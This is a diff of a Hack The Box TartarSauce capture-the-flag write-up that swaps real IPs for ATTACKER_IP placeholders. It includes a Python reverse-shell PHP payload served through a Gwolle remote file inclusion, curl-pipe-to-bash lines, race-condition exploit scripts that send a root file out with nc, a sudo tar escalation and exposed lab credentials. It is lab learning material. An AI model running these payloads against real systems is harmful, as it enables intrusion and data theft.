@@ -32,13 +32,13 @@ As `www-data`, `sudo -l` allows `tar` as `onuma`. GTFOBins-style `--checkpoint-a
 **rustscan**
 
 ```bash
-rustscan -a "$IP_ADDRESS" -ulimit 5000 -- -sC -sV -oA "/home/julien/.hacklas/./targets/track-oscp/TartarSauce/nmap/quick"
+rustscan -a "$IP_ADDRESS" -ulimit 5000 -- -sC -sV -oA "nmap/quick"
 ```
 
 **nmap**
 
 ```bash
-nmap -sC -sV -p- -oA "/home/julien/.hacklas/./targets/track-oscp/TartarSauce/nmap/full" "$IP_ADDRESS"
+nmap -sC -sV -p- -oA "nmap/full" "$IP_ADDRESS"
 
 └──╼ $ nmap -sC -sV -oA ./nmap/quick.nmap 10.129.1.185
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-06 22:25 +08
@@ -400,7 +400,7 @@ Host a malicious `wp-load.php` on the attacker box:
 
 ```php
 <?php
-exec("python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.97\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'");
+exec("python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'");
 ?>
 ```
 
@@ -408,7 +408,7 @@ Trigger the include:
 
 ```bash
 ┌─[julien@parrot]─[~/.hacklas/targets/track-oscp/TartarSauce/exploit]
-└──╼ $ curl 'http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.97/' -vv
+└──╼ $ curl 'http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://ATTACKER_IP/' -vv
 02:35:10.914935 [0-0] * Host tartarsauce.htb:80 was resolved.
 02:35:10.914968 [0-0] * IPv6: (none)
 02:35:10.914977 [0-0] * IPv4: 10.129.1.185
@@ -419,7 +419,7 @@ Trigger the include:
 02:35:10.923268 [0-0] * [SETUP] Curl_conn_connect(block=0) -> 0, done=1
 02:35:10.923462 [0-0] * Connected to tartarsauce.htb (10.129.1.185) port 80
 02:35:10.923509 [0-0] * using HTTP/1.x
-02:35:10.923587 [0-0] > GET /webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.97/ HTTP/1.1
+02:35:10.923587 [0-0] > GET /webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://ATTACKER_IP/ HTTP/1.1
 02:35:10.923587 [0-0] > Host: tartarsauce.htb
 02:35:10.923587 [0-0] > User-Agent: curl/8.14.1
 02:35:10.923587 [0-0] > Accept: */*
@@ -593,7 +593,7 @@ onuma@TartarSauce:~$
 `sudo -l` as onuma needs a password, so local enum continues with `linenum.sh`:
 
 ```bash
-onuma@TartarSauce:~$ curl http://10.10.14.97:80/linenum.sh | bash
+onuma@TartarSauce:~$ curl http://ATTACKER_IP:80/linenum.sh | bash
 
 ...
 
@@ -709,7 +709,7 @@ The 30-second sleep after creating `$tmpfile` is the race window. Build a malici
 ```bash
 #!/bin/bash
 
-# call with: curl http://10.10.14.97:80/backuperer-exploit/exploit.sh | bash
+# call with: curl http://ATTACKER_IP:80/backuperer-exploit/exploit.sh | bash
 cd /dev/shm
 
 # prep malicious tar
@@ -733,7 +733,7 @@ done
 sleep 35
 
 cat /var/backups/onuma_backup_error.txt 
-cat /var/backups/onuma_backup_error.txt | nc 10.10.14.97 4443
+cat /var/backups/onuma_backup_error.txt | nc ATTACKER_IP 4443
 ```
 
 ```bash
@@ -815,11 +815,11 @@ rm -rf evil
 ```bash
 #!/bin/bash
 
-# call with: curl http://10.10.14.97:80/backuperer-exploit-shell/exploit.sh | bash
+# call with: curl http://ATTACKER_IP:80/backuperer-exploit-shell/exploit.sh | bash
 cd /tmp
 
 # assuming http server is running from previous exploit
-curl http://10.10.14.97:80/backuperer-exploit-shell/evil.tar.gz -o /tmp/evil.tar.gz
+curl http://ATTACKER_IP:80/backuperer-exploit-shell/evil.tar.gz -o /tmp/evil.tar.gz
 
 echo "Waiting for cron..."
 
@@ -855,10 +855,11 @@ Stage result: root shell (and confirmation of the root flag).
 
 ## Credentials
 
-| Source                                              | Credential                                     | Notes                                                             |
-| --------------------------------------------------- | ---------------------------------------------- | ----------------------------------------------------------------- |
-| Monstra admin (`/webservices/monstra-3.0.4/admin/`) | `admin:admin`                                  | RCE path is a dead end (HTTP 500)                                 |
-| `/var/www/html/config.php`                          | `wpuser` / `w0rdpr3$$d@t@b@$3@cc3$$` (DB `wp`) | Not usable as `www-data` without the password on the mysql client |
+**Monstra admin (`/webservices/monstra-3.0.4/admin/`)** — `admin:admin`
+RCE path is a dead end (HTTP 500).
+
+**`/var/www/html/config.php`** — `wpuser` / `w0rdpr3$$d@t@b@$3@cc3$$` (DB `wp`)
+Not usable as `www-data` without the password on the mysql client.
 
 ---
 
@@ -879,13 +880,11 @@ Stage result: root shell (and confirmation of the root flag).
 
 ## Tools & cheat sheet
 
-| Tool                       | Purpose in this box                        | Key command                                                                                    |
-| -------------------------- | ------------------------------------------ | ---------------------------------------------------------------------------------------------- |
-| `nmap` / `rustscan`        | Port / service discovery                   | `nmap -sC -sV -oA ./nmap/quick.nmap 10.129.1.185`                                              |
-| `gobuster`                 | Find `/webservices/wp/`                    | `gobuster dir -w …/directory-list-2.3-medium.txt -u 'http://10.129.1.185/webservices/'`        |
-| `wpscan`                   | Aggressive plugin discovery (`gwolle-gb`)  | `wpscan --enumerate all-plugins` (aggressive)                                                  |
-| `searchsploit`             | Gwolle RFI advisory / PoC                  | `searchsploit gwolle`                                                                          |
-| Gwolle RFI + `wp-load.php` | Unauth RCE as `www-data`                   | `curl '…/ajaxresponse.php?abspath=http://10.10.14.97/'`                                        |
-| `sudo tar` (GTFOBins)      | Escalate `www-data` → `onuma`              | `sudo -u onuma tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash …` |
-| `linenum.sh`               | Spot `backuperer.timer`                    | `curl http://10.10.14.97:80/linenum.sh \| bash`                                                |
-| Archive-swap exploit       | Race `backuperer` → root flag / SUID shell | swap `/var/tmp/.*` with symlink (or SUID) tarball during the 30s sleep                         |
+- [`nmap`](/hacklas/enumeration/port-scan/nmap.md) / [`rustscan`](/hacklas/enumeration/port-scan/rustscan.md) — Port / service discovery
+- **`gobuster`** — Find `/webservices/wp/`
+- [`wpscan`](/hacklas/enumeration/wordpress/wpscan.md) — Aggressive plugin discovery (`gwolle-gb`)
+- [`searchsploit`](/hacklas/enumeration/vulnerability-scanning/searchsploit.md) — Gwolle RFI advisory / PoC
+- [Gwolle RFI + `wp-load.php`](/hacklas/infiltration/web/file-traversal-lfi-rfi.md) — Unauth RCE as `www-data`
+- [`sudo tar` (GTFOBins)](/hacklas/escalation/linux/sudo.md) — Escalate `www-data` → `onuma`
+- **`linenum.sh`** — Spot `backuperer.timer`
+- **Archive-swap exploit** — Race `backuperer` → root flag / SUID shell
